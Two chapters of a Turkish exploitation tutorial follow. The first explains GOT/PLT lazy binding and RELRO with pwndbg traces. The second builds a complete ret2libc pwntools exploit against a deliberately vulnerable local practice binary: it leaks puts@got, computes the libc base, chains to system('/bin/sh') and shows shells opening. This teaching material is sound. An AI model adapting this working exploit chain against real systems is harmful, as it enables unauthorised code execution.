# Bölüm 14: GOT ve PLT: program libc'yi nasıl bulur

## Bu bölümde

ASLR libc'yi her seferinde başka bir yere koyuyor. Peki programın kendisi `puts`'u nasıl buluyor? Program derlenirken `puts`'un nerede olacağı bilinmiyordu. Cevap, programın içindeki iki küçük tabloda: PLT ve GOT. Bu bölümde bu tabloları canlı bir programda çalışırken izleyeceğiz. Bölümün sonunda, bir sonraki bölümdeki saldırının hangi adresi sızdıracağını tam olarak bileceksin.

**Ön koşullar:** Bölüm 3 (izinler), Bölüm 13 (taban + offset, sızıntı).

**Bu bölümün sonunda:**

- `call puts@plt` komutunun libc'deki `puts`'a hangi adımlarla ulaştığını numaralı bir şemayla anlatabileceksin.
- pwndbg'nin `got` komutuyla GOT'un ilk çağrıdan önceki ve sonraki halini karşılaştırabileceksin.
- GOT'un neden hem sızıntı hem yazma hedefi olduğunu açıklayabileceksin.
- Partial ve Full RELRO arasındaki farkı `checksec` çıktısından okuyabileceksin.

## Sezgi: santral

Eski şirketlerdeki telefon santralini düşün. Çalışanların masasında her müdürün dahili numarası yazılı bir liste var. Ama müdürlerin gerçek telefon numaraları her gün değişiyor. Çalışan dahili numarayı çevirir (PLT). Santral, panodaki güncel numaraya bakar (GOT) ve aramayı oraya bağlar. Panoya sabah ilk aramada güncel numara yazılır, sonraki aramalar doğrudan bağlanır.

Saldırgan açısından iki şey ilginç. Birincisi, panoyu **okuyabilirsen** müdürün gerçek numarasını öğrenirsin. İkincisi, panoya **yazabilirsen** müdürü arayan herkesi kendi numarana yönlendirirsin.

Benzetmenin bozulduğu yer: gerçek santralde pano kilitli bir odadadır. Programın GOT'u ise ayarlara göre yazılabilir bir bellek bölgesinde durabilir. Bu "ayar" RELRO.

## Çağrı nereye gidiyor

`e05_libc`'nin `vuln`'üne bak:

```nasm
401150:  lea    rax,[rip+0xead]
401157:  mov    rdi,rax
40115a:  call   401030 <puts@plt>
```

`call` libc'deki `puts`'a değil, programın **kendi içindeki** `0x401030` adresine gidiyor. PIE kapalı olduğu için bu adres sabit. Orada ne var?

```bash
objdump -d -M intel --no-show-raw-insn ~/cracks/e05_libc | sed -n '/<puts@plt>:/,/^$/p'
```

```text
0000000000401030 <puts@plt>:
  401030:	jmp    QWORD PTR [rip+0x2fca]        # 404000 <puts@GLIBC_2.2.5>
  401036:	push   0x0
  40103b:	jmp    401020 <_init+0x20>
```

İlk komut: **`0x404000` adresinde yazan adrese zıpla.** Köşeli parantez kuralı: `jmp [adres]`, adresin kendisine değil, o adreste **yazan değere** zıplar.

- **PLT** (Procedure Linkage Table): `puts@plt` gibi küçük atlama noktalarının tablosu. Kod bölümünde, salt okunur. Adresi sabit.
- **GOT** (Global Offset Table): her libc fonksiyonunun **gerçek adresinin yazılacağı** kutuların tablosu. Veri bölümünde, **yazılabilir**. Kutunun adresi sabit (`0x404000`), içindeki değer çalışma anında doldurulur.

## Tembel bağlama, adım adım

```text
  program                    PLT                        GOT [0x404000]          libc
  ───────                    ───                        ──────────────          ────
  ① call puts@plt ─────────▶ ② jmp [0x404000] ────────▶ ilk seferde içinde:
                                                          0x401036 (plt+6)
                             ③ push 0x0  ◀─────────────────┘
                             ④ jmp çözücü
                                    │
                                    ▼
                             ⑤ çözücü libc'de "puts"u arar ───────────────▶ 0x7ffff7e34110
                             ⑥ bulduğu adresi GOT'a yazar ──▶ 0x7ffff7e34110
                             ⑦ puts'a zıplar ────────────────────────────────▶ puts çalışır

  ikinci çağrı:
  ① call puts@plt ─────────▶ ② jmp [0x404000] ────────▶ 0x7ffff7e34110 ─────▶ puts çalışır
```

1. Program `puts@plt`'yi çağırır.
2. PLT, GOT'taki değere zıplar. İlk seferde GOT'ta, PLT'nin hemen bir sonraki komutunun adresi (`0x401036`) yazıyor.
3. `push 0x0`: "0 numaralı fonksiyonu (puts) çöz" bilgisi yığına konur.
4. Çözücüye (resolver) zıplanır. Çözücü dinamik bağlayıcının (`ld.so`) bir parçası.
5. Çözücü libc'nin sembol tablosunda `puts`'u bulur.
6. Bulduğu adresi GOT'a yazar.
7. `puts`'u çalıştırır.

İkinci çağrıda adım 2'deki `jmp` doğrudan libc'ye gider. Bu "ilk kullanımda bul, sonra hatırla" mekanizmasına **tembel bağlama (lazy binding)** denir. Amaç, programın açılışını hızlandırmak: hiç çağrılmayan fonksiyonlar için çözücü hiç çalışmaz.

## Deneme sürüşü: GOT'u canlı izlemek

`puts` ilk kez çağrılmadan önce ve sonra GOT'a bakalım:

```bash
pwndbg -q ~/cracks/e05_libc
b *vuln
r < /dev/null
x/gx 0x404000
got
finish
x/gx 0x404000
got
```

Önce (`vuln`'ün başında, `puts` henüz çağrılmamış):

```text
0x404000 <puts@got.plt>:	0x0000000000401036
GOT protection: Partial RELRO | Found 3 GOT entries passing the filter
[0x404000] puts@GLIBC_2.2.5 -> 0x401036 (puts@plt+6) ◂— push 0
[0x404008] read@GLIBC_2.2.5 -> 0x401046 (read@plt+6) ◂— push 1
[0x404010] setvbuf@GLIBC_2.2.5 -> 0x7ffff7e348f0 (setvbuf) ◂— push r14
```

Sonra (`vuln` bitti, `puts` ve `read` çağrıldı):

```text
0x404000 <puts@got.plt>:	0x00007ffff7e34110
[0x404000] puts@GLIBC_2.2.5 -> 0x7ffff7e34110 (puts) ◂— push r14
[0x404008] read@GLIBC_2.2.5 -> 0x7ffff7eb4170 (read) ◂— sub rsp, 0x10
[0x404010] setvbuf@GLIBC_2.2.5 -> 0x7ffff7e348f0 (setvbuf) ◂— push r14
```

Ne oldu:

- **Önce**, `puts`'un kutusunda `0x401036` (`puts@plt+6`, yani `push 0`) yazıyordu. Şemadaki 2. ve 3. adım.
- **Sonra**, aynı kutuda `0x7ffff7e34110` var: libc'deki gerçek `puts`. Şemadaki 6. adım gerçekleşmiş.
- `setvbuf` iki çıktıda da gerçek adresini gösteriyor, çünkü `main`'in başında zaten çağrılmıştı.
- `read`'in kutusu da `0x401046`'dan `0x7ffff7eb4170`'e dönmüş.

Son iki satırı Bölüm 13'teki formülle karşılaştır: `0x7ffff7e34110 − 0x7b110 = 0x7ffff7db9000`. gdb'deki libc tabanı. Son üç basamak `000`. Sağlama tuttu.

## Exploit için iki altın kural

**1. GOT, sabit bir adreste bir libc adresi tutar.**

PIE kapalıyken `0x404000` her zaman aynı adres, içindeki değer ise libc'nin o anki yeri. Bu kutuyu okuyabilirsek libc'nin nerede olduğunu öğreniriz. Bir sonraki bölümde tam olarak bunu yapacağız: `puts(0x404000)` çağırıp `puts`'un kendi adresini ekrana döktüreceğiz.

**2. GOT yazılabilir (Partial RELRO'da).**

`0x404000` bölgesi `rw-p`. Bir yazma imkânın varsa, örneğin Bölüm 16'daki format string hatası, `puts`'un kutusuna `system`'in adresini yazabilirsin. Program bir sonraki `puts("/bin/sh")` çağrısında aslında `system("/bin/sh")` çağırmış olur. Bu tekniğin adı **GOT üzerine yazma (GOT overwrite)**.

## PLT adresini bulmak

Bir sonraki bölümde `puts@plt`'nin adresine ihtiyacımız olacak. pwntools normalde bunu `e.plt.puts` ile verir. Bu makinede vermiyor, çünkü PLT'yi doldurmak için kullandığı `unicorn` paketi kurulu değil:

```text
[!] Could not populate PLT: No module named 'unicorn'
```

`objdump` ile kendimiz bulalım:

```bash
objdump -d ~/cracks/e05_libc | grep '@plt>:'
```

```text
0000000000401030 <puts@plt>:
0000000000401040 <read@plt>:
0000000000401050 <setvbuf@plt>:
```

GOT adresleri pwntools'tan sorunsuz gelir: `ELF(...).got.puts` = `0x404000`.

## Savunma tarafı: RELRO

İkinci altın kural tehlikeli olduğu için **RELRO** (RELocation Read-Only) adında bir koruma var:

| Tür | Ne yapar | `checksec` | Derleme |
|---|---|---|---|
| Yok | GOT tamamen yazılabilir | `No RELRO` | `-Wl,-z,norelro` |
| Kısmi | Bazı tablolar salt okunur, fonksiyonların GOT'u hâlâ yazılabilir, tembel bağlama açık | `Partial RELRO` | çoğu durumda varsayılan |
| Tam | Program başlarken bütün adresler çözülür, sonra GOT **salt okunur** yapılır | `Full RELRO` | `-Wl,-z,relro,-z,now` |

```bash
pwn checksec ~/cracks/e05_libc | grep RELRO
pwn checksec ~/cracks/e09_full | grep RELRO
```

```text
    RELRO:      Partial RELRO
    RELRO:      Full RELRO
```

Full RELRO'da tembel bağlama olmaz ve GOT'a yazmaya çalışmak programı çökertir. Bedeli biraz daha yavaş açılış. Birçok modern dağıtım, güvenlik açısından önemli paketleri Full RELRO ile derler.

Ama birinci kural Full RELRO'da da geçerli: **GOT'u okumak her zaman mümkün.** RELRO sızıntıyı değil, yazmayı engeller. `e09_full`'de ise başka bir sızıntı kaynağı kullanacağız, çünkü orada PIE yüzünden GOT'un adresini de bilmeyeceğiz.

> [!WARNING]
> **Sık yapılan hatalar**
>
> - **`jmp [0x404000]`'i `jmp 0x404000` sanmak.** İlki adresteki değere, ikincisi adresin kendisine zıplar.
> - **`puts@plt` ile `puts@got`'u karıştırmak.** `puts@plt` çağrılır (kod). `puts@got` okunur ya da yazılır (veri, içinde bir adres var).
> - **Henüz çağrılmamış bir fonksiyonun GOT'unu sızdırmak.** Partial RELRO'da o kutuda hâlâ PLT'nin adresi durur, libc'nin değil.
> - **Full RELRO'da GOT overwrite denemek.** Sayfa salt okunur, program çöker.

## Kontrol soruları

1. `call puts@plt` neden doğrudan libc'ye gitmiyor?
2. İlk çağrıdan önce `puts`'un GOT kutusunda ne yazar?
3. Tembel bağlamanın amacı ne?
4. `puts@got`'u sızdırmak sana ne kazandırır?
5. Partial RELRO ile Full RELRO arasındaki fark exploit açısından ne?
6. Full RELRO açıkken GOT'u okumak mümkün mü?

## Alıştırmalar

1. **Gözlemle.** `x/3i 0x401040` ile `read@plt`'yi oku. Hangi GOT adresine zıplıyor? `got` çıktısıyla karşılaştır.
2. **Tahmin et, sonra dene.** `e09_full`'de `b *vuln` ile durup `got` çalıştırmadan önce tahmin et: `puts`'un kutusunda PLT adresi mi, libc adresi mi yazacak? Neden?
3. **Kendin yap.** `e05_libc`'de `finish` sonrası GOT'taki `read` adresinden libc tabanını elle hesapla (`read` offset'ini pwntools'tan bul). `000` ile bitiyor mu?

## Özet

- `call puts@plt` → PLT → `jmp [GOT]` → libc.
- İlk çağrıda GOT'ta PLT'nin bir sonraki komutu yazar, çözücü gerçek adresi bulup GOT'a yazar: tembel bağlama.
- GOT'un adresi (PIE kapalıyken) sabit, içeriği libc adresi: mükemmel sızıntı hedefi.
- Partial RELRO'da GOT yazılabilir: GOT overwrite.
- Full RELRO GOT'u salt okunur yapar ama okumayı engellemez.
- `e.plt` bu makinede boş. PLT adresini `objdump` ile bul.

Bütün parçalar elimizde. Sıradaki bölümde NX ve ASLR açıkken, programda hiçbir `win` fonksiyonu yokken kabuk açacağız.

---
**Kontrol sorularının cevapları**

1. Program derlenirken libc'nin nerede olacağı bilinmiyordu. Çağrı, programın içindeki sabit bir atlama noktasına (PLT) yapılır.
2. `puts@plt+6`, yani PLT'deki `push 0x0` komutunun adresi.
3. Program açılırken bütün fonksiyonları çözmek yerine, sadece gerçekten kullanılanları ilk kullanımda çözmek. Açılış hızlanır.
4. `puts`'un libc'deki gerçek adresini. Ondan offset'i çıkararak libc'nin tabanını hesaplarsın.
5. Partial RELRO'da fonksiyonların GOT'u yazılabilir, Full RELRO'da değil.
6. Evet. Sayfa salt okunur yapılır, okunamaz yapılmaz.

**Bu bölümde geçen yeni terimler:** PLT, GOT, tembel bağlama (lazy binding), çözücü (resolver), dinamik bağlayıcı (`ld.so`), GOT overwrite, RELRO.


# Bölüm 15: ret2libc: libc'den kabuk açmak

## Bu bölümde

Bu bölüm kitabın dönüm noktası. NX açık, ASLR açık, programda `win` yok. Elimizde sadece bir taşma var. Buna rağmen bir kabuk açacağız. Bunun için önceki dört bölümde öğrendiğin her şeyi tek bir exploit'te birleştireceğiz: dönüş adresini kontrol etmek, `pop rdi; ret` ile argüman vermek, GOT'tan bir libc adresi sızdırmak ve tabanı hesaplamak. Ayrıca kitabı yazarken bizi gerçekten çökerten bir hatayı, yığın hizalamasını, adım adım teşhis edeceğiz.

**Ön koşullar:** Bölüm 8 (zamanlama tuzağı), Bölüm 12 (ROP), Bölüm 13 (taban hesabı), Bölüm 14 (GOT/PLT).

**Bu bölümün sonunda:**

- `puts(puts@got)` zinciriyle libc adresi sızdırıp programı `main`'e döndürebileceksin.
- Sızan adresten libc tabanını, `system`'i ve `"/bin/sh"` metnini hesaplayabileceksin.
- İki aşamalı bir exploit'i pwntools ile yazıp ASLR açıkken tekrar tekrar çalıştırabileceksin.
- Hizalama kaynaklı bir çöküşü belirtilerinden tanıyıp `ret` gadget'ıyla düzeltebileceksin.

## Sezgi: önce keşif, sonra baskın

Bir binaya girmek istiyorsun ama binanın adresi her gün değişiyor. İlk gün binaya gidip içeri giremezsin, ama bir pencereden içeri bakıp "kapı şu tarafta" diye not alabilirsin. Sonra hemen, bina taşınmadan, aynı gün geri dönüp içeri girersin.

ret2libc aynen böyle iki turlu. Birinci tur keşif: programa libc'nin nerede olduğunu söyletiriz. İkinci tur baskın: hesapladığımız adreslerle `system("/bin/sh")` çağırırız. İki tur arasında program kapanmamalı, yoksa libc başka bir yere taşınır.

## Hedef

```c
/* e05_libc: NX + ASLR. libc sizdir, system("/bin/sh") cagir. Kanarya/PIE yok. */
#include <stdio.h>
#include <unistd.h>

__asm__(".globl gadget\ngadget:\n pop %rdi\n ret\n");

void vuln(void)
{
    char buf[32];
    puts("girdi:");
    read(0, buf, 200);
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    puts("normal cikis.");
    return 0;
}
```

```bash
pwn checksec ~/cracks/e05_libc
```

```text
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

`win` yok. Hedef libc'deki `system`. `system("/bin/sh")` kabuk açar. `"/bin/sh"` metni libc'nin içinde zaten var, çünkü `system`'in kendisi her komutu `/bin/sh -c komut` şeklinde çalıştırır.

## Plan

```text
1. TUR (keşif)                          2. TUR (baskın)
┌─────────────────────┐                ┌─────────────────────┐
│ A * 40              │                │ A * 40              │
│ pop rdi ; ret       │                │ pop rdi ; ret       │
│ puts@got (0x404000) │ → rdi          │ "/bin/sh" adresi    │ → rdi
│ puts@plt (0x401030) │ puts(rdi)      │ ret                 │ hizalama
│ main                │ baştan başla   │ system              │ system(rdi)
└─────────────────────┘                └─────────────────────┘
ekrana: puts'un libc adresi            kabuk
```

**1. tur:** `puts`'u, argümanı `puts`'un kendi GOT kutusu olacak şekilde çağırırız. `puts` bir adresi metin gibi yazdırır: GOT kutusundaki baytları, ilk null bayta kadar ekrana döker. Bu baytlar `puts`'un libc'deki adresi. Zincirin sonunda `main`'e döneriz. Program kapanmaz, baştan başlar ve tekrar girdi ister. libc aynı yerde kalır.

**2. tur:** Tabanı biliyoruz. `system`'i ve `"/bin/sh"`'yi hesaplayıp ikinci zinciri göndeririz.

## 1. tur: keşif

```python
from pwn import *
context.log_level = "error"
e    = ELF("/home/linkola/cracks/e05_libc", checksec=False)
libc = ELF("/usr/lib/libc.so.6", checksec=False)
pop_rdi  = e.sym.gadget          # pop rdi ; ret
ret      = pop_rdi + 1           # tek başına ret
PUTS_PLT = 0x401030              # objdump -d e05_libc | grep "<puts@plt>:"

p = process(e.path)

p.recvuntil(b"girdi:\n")
chain1 = [pop_rdi, e.got.puts, PUTS_PLT, e.sym.main]
p.send((b"A"*40 + b"".join(p64(x) for x in chain1)).ljust(200, b"\0"))
leak = u64(p.recvuntil(b"\ngirdi:\n", drop=True).ljust(8, b"\0"))
libc.address = leak - libc.sym.puts
print("puts  =", hex(leak))
print("libc  =", hex(libc.address))
```

Her satırın bir hikâyesi var:

- **`context.log_level = "error"`**: pwntools'un "programı başlattım" gibi bilgi mesajlarını susturur.
- **`.ljust(200, b"\0")`**: `read` 200 bayt okuyor. Payload'ı 200'e tamamlarsak `read` tam olarak payload'ı alır. Bölüm 8'deki zamanlama tuzağı.
- **`recvuntil(b"\ngirdi:\n", drop=True)`**: sızan adresin ardından program `main`'e döner ve yine `girdi:` yazar. Bu metne kadar olan her şey sızıntı. Neden `recvline()` değil? Çünkü adresin baytlarından biri tesadüfen `0x0a` olabilir ve `recvline` orada keser. Bu gerçekten oldu: ilk sürümde bir çalıştırmada sızıntı `0x4110` olarak, yani yarım geldi ve taban `-0x77000` gibi saçma bir sayı çıktı.
- **`.ljust(8, b"\0")`**: `puts` metin yazar, ilk null bayta kadar. 64 bitlik bir libc adresinin üst iki baytı `00`, yani sadece 6 bayt gelir. Sekize tamamlıyoruz.
- **`libc.address = ...`**: pwntools'a tabanı söylüyoruz. Bundan sonra `libc.sym.system` otomatik olarak gerçek adresi verir.

## 2. tur: baskın

```python
binsh  = next(libc.search(b"/bin/sh\0"))   # libc içindeki "/bin/sh"
chain2 = [pop_rdi, binsh, ret, libc.sym.system]
p.send((b"A"*40 + b"".join(p64(x) for x in chain2)).ljust(200, b"\0"))
p.sendline(b"echo SHELL_ACILDI; id -un")
print(p.recvline(timeout=2), p.recvline(timeout=2))
```

## Deneme sürüşü

Üç kere çalıştırdık:

```text
puts  = 0x7242a0d7e110
libc  = 0x7242a0d03000
b'SHELL_ACILDI\n' b'linkola\n'
puts  = 0x76570c6db110
libc  = 0x76570c660000
b'SHELL_ACILDI\n' b'linkola\n'
puts  = 0x74e924719110
libc  = 0x74e92469e000
b'SHELL_ACILDI\n' b'linkola\n'
```

Sonuçları oku:

- Her seferinde libc başka bir yerde: ASLR tam olarak çalışıyor.
- Hesaplanan tabanların hepsi `000` ile bitiyor: sağlama tuttu.
- `puts`'un son üç basamağı hep `110`: offset `0x7b110`.
- Her seferinde kabuk açıldı.

NX ve ASLR açıkken, programda hiçbir `win` yokken kabuk açtın. Gerçek dünyadaki exploit'lerin temel kalıbı bu.

## Teşhis: o `ret` neden orada

İkinci zincirde `pop_rdi, binsh` ile `system` arasına bir `ret` koyduk. Görünürde hiçbir işe yaramıyor: sadece bir sonraki adrese geçiyor. Kaldıralım:

```python
chain2 = [pop_rdi, binsh, libc.sym.system]    # ret yok
```

```text
puts  = 0x7d03874fc110
libc  = 0x7d0387481000
cikis kodu: -11
```

Program SIGSEGV ile öldü. Sızıntı doğru, taban doğru, zincir doğru. Peki neden?

Bunu tahminle değil kanıtla çözelim. Aynı hizasız zinciri bir kere daha çalıştırdık, bu sefer çekirdeğe programın çöktüğü andaki halini bir dosyaya (**core dump**) yazdırıp pwntools ile okuduk (yöntem Bölüm 21'de). ASLR yüzünden adresler bu çalıştırmada farklı:

```text
rip   = 0x7234c5313d1b
rsp   = 0x7fff4fcecb48 rsp % 16 = 8
komut =     7234c5313d1b:       0f 29 44 24 50          movaps XMMWORD PTR [rsp+0x50], xmm0
```

Program **`movaps`** komutunda öldü, ve o anda `rsp % 16 = 8`.

Bölüm 10'da bahsettiğimiz kural: bir `call` komutundan hemen önce `rsp` 16'nın katı olmalı. `movaps` (move aligned packed single) 16 baytı tek seferde belleğe yazar ve **adresin 16'nın katı olmasını şart koşar**. Değilse işlemci hata üretir. `system`'in çağırdığı `do_system` fonksiyonunun içinde tam böyle bir komut var:

```bash
objdump -d -M intel --no-show-raw-insn --start-address=0x50bb0 --stop-address=0x51030 /usr/lib/libc.so.6 | grep movaps
```

```text
   50d1b:	movaps XMMWORD PTR [rsp+0x50],xmm0
   50e6f:	movaps XMMWORD PTR [rsp+0x10],xmm0
```

Çöken komutun libc'deki offset'i: `0x7234c5313d1b − 0x7234c52c3000 = 0x50d1b`. `objdump`'taki ilk satır. Kanıt tam.

ROP'ta fonksiyonlara `call` ile değil `ret` ile gireriz. Her `ret` ve her `pop`, `rsp`'yi 8 kaydırır. Zincirdeki halka sayısına göre fonksiyona girdiğimizde `rsp` ya doğru hizada olur ya da 8 bayt kaymış olur. Fazladan bir `ret` 8 bayt daha kaydırarak hizayı düzeltir.

> [!TIP]
> **Pratik kural:** ROP ile libc'de bir fonksiyon çağırdığın zincir hedef fonksiyonun içinde çöküyorsa, fonksiyonun adresinden hemen önce bir `ret` gadget'ı ekle ya da varsa çıkar. İkisinden biri mutlaka çalışır. Çöküşte `movaps` görüyorsan sebep kesinlikle hizalama.

## Bütün exploit

Bu dosya `~/.cracks_src/e05_libc_x.py` olarak duruyor:

```python
from pwn import *
context.log_level = "error"
e    = ELF("/home/linkola/cracks/e05_libc", checksec=False)
libc = ELF("/usr/lib/libc.so.6", checksec=False)
pop_rdi  = e.sym.gadget
ret      = pop_rdi + 1
PUTS_PLT = 0x401030

p = process(e.path)

# 1. tur: puts(puts@got) ile libc adresini sızdır, sonra main'e dön
p.recvuntil(b"girdi:\n")
chain1 = [pop_rdi, e.got.puts, PUTS_PLT, e.sym.main]
p.send((b"A"*40 + b"".join(p64(x) for x in chain1)).ljust(200, b"\0"))
leak = u64(p.recvuntil(b"\ngirdi:\n", drop=True).ljust(8, b"\0"))
libc.address = leak - libc.sym.puts

# 2. tur: system("/bin/sh")
binsh  = next(libc.search(b"/bin/sh\0"))
chain2 = [pop_rdi, binsh, ret, libc.sym.system]
p.send((b"A"*40 + b"".join(p64(x) for x in chain2)).ljust(200, b"\0"))
p.interactive()
```

`p.interactive()` klavyeni kabuğa bağlar. `ls`, `id`, `exit` yazabilirsin.

## Uzaktaki bir sunucuda

CTF'lerde program başka bir makinede çalışır ve onun libc'si seninkinden farklı olabilir, yani offset'ler de farklıdır. Görevler genelde libc dosyasını da birlikte verir: `ELF("/usr/lib/libc.so.6")` yerine o dosyayı kullanırsın. Verilmediyse, sızdırdığın iki fonksiyonun son üç basamağıyla (örneğin `puts` → `110`, `read` → `170`) `libc.rip` gibi veri tabanlarında arama yapıp sürümü bulabilirsin.

## Savunma tarafı

Bu exploit dört varsayıma dayanıyordu. Her biri bir korumayla kırılabilir:

| Varsayım | Kıran koruma |
|---|---|
| Dönüş adresine yazabiliriz | Canary (Bölüm 17), FORTIFY |
| Programın adresleri (gadget, PLT, GOT, `main`) sabit | PIE (Bölüm 18) |
| Program bir libc adresini dışarı verebilir | Bu bir sızıntı. Programın kendisi bunu engelleyemez, ama PIE açıkken GOT'un adresini bilmeyiz. |
| `ret` istediğimiz yere zıplar | CET gölge yığın |

Kaynak kod tarafında asıl çözüm yine aynı: `read(0, buf, sizeof(buf))`.

> [!WARNING]
> **Sık yapılan hatalar**
>
> - **Sızıntıyı `recvline` ile okumak.** Adreste `0x0a` varsa yarım gelir. `recvuntil(sonraki_metin, drop=True)`.
> - **`u64`'e 6 bayt vermek.** `ljust(8, b"\0")`.
> - **Birinci zincirin sonuna `main` koymayı unutmak.** Program kapanır, ikinci tura gelemezsin.
> - **Payload'ı `read` boyutuna tamamlamamak.** İkinci gönderim yutulur, kabuk komut almaz.
> - **Hizalama.** `system` içinde çöküyorsa `ret` ekle ya da çıkar.

## Kontrol soruları

1. Birinci zincirin her halkası ne yapıyor?
2. `puts(puts@got)` ekrana ne yazar, neden 8 değil 6 bayt?
3. Birinci zincir neden `main` ile bitiyor?
4. `libc.address` atamasından sonra `libc.sym.system` neyi verir?
5. `ret`'i kaldırınca program neden `movaps`'ta çöküyor?
6. Sızıntıyı okurken `recvline` yerine `recvuntil` kullanmamızın sebebi ne?

## Alıştırmalar

1. **Gözlemle.** Exploit'i 10 kere çalıştır. `libc` satırları hep `000` ile mi bitiyor? `puts` hep `110` ile mi?
2. **Tahmin et, sonra dene.** 1. turda `puts@got` yerine `read@got`'u sızdır ve tabanı `libc.sym.read` ile hesapla. Aynı tabanı bulacak mısın? Neden?
3. **Kendin yap.** 2. turda `system` yerine `puts`'u çağırıp `"/bin/sh"` metnini ekrana yazdır. Bir şey kazandırmaz ama zincirin doğru çalıştığını kanıtlar. Burada `ret` gerekiyor mu?
4. **Kendin yap.** `recvuntil` yerine `recvline` kullanıp exploit'i 50 kere çalıştıran bir döngü yaz. Kaç kere başarısız oluyor?
5. **Merdiven.** p07 ret2libc bu bölümün konusu.

## Özet

- ret2libc iki turlu: `puts(puts@got)` ile sızdır ve `main`'e dön, sonra `system("/bin/sh")`.
- Taban = sızan adres − offset. `"/bin/sh"` libc'nin içinde: `libc.search`.
- Sızıntıyı `recvuntil(..., drop=True)` ile oku, `ljust(8)` ile tamamla.
- Payload'ı `read` boyutuna `ljust` ile tamamla.
- Hizalama: `movaps` çöküşü, `ret` gadget'ı ile düzelt.
- Core dump, çöküşü tahminden kanıta çevirir.

Bu exploit'te sızıntıyı ROP ile, bir fonksiyon çağırarak aldık. Bir sonraki bölümde çok daha doğrudan bir sızıntı kaynağı göreceğiz: `printf`'in kendisi.

---
**Kontrol sorularının cevapları**

1. `pop rdi` + `puts@got`: `rdi` = GOT kutusunun adresi. `puts@plt`: `puts(rdi)` çağrılır. `main`: `puts` dönünce program baştan başlar.
2. GOT kutusundaki baytları, yani `puts`'un libc adresini. Adresin üst iki baytı `00` olduğu için `puts` orada durur.
3. Program kapanmasın ve ikinci girdiyi alsın diye. Kapanırsa libc yeni bir yere yüklenir.
4. Taban eklenmiş gerçek `system` adresini.
5. Zincir `system`'e 16'nın katı olan bir `rsp` ile giriyor. Fonksiyonun içinde `rsp` 8 kaymış oluyor ve `movaps` hizasız bir adrese yazmaya çalışıyor.
6. Adresin baytları arasında `0x0a` olabilir. `recvline` orada keser, `recvuntil` ise bir sonraki bilinen metne kadar okur.

**Bu bölümde geçen yeni terimler:** ret2libc, `system`, core dump, `movaps`, `libc.search`.

---

[← 07-nx-rop-aslr](07-nx-rop-aslr.md) · [İçindekiler](README.md) · [09-format-string-ve-canary →](09-format-string-ve-canary.md)
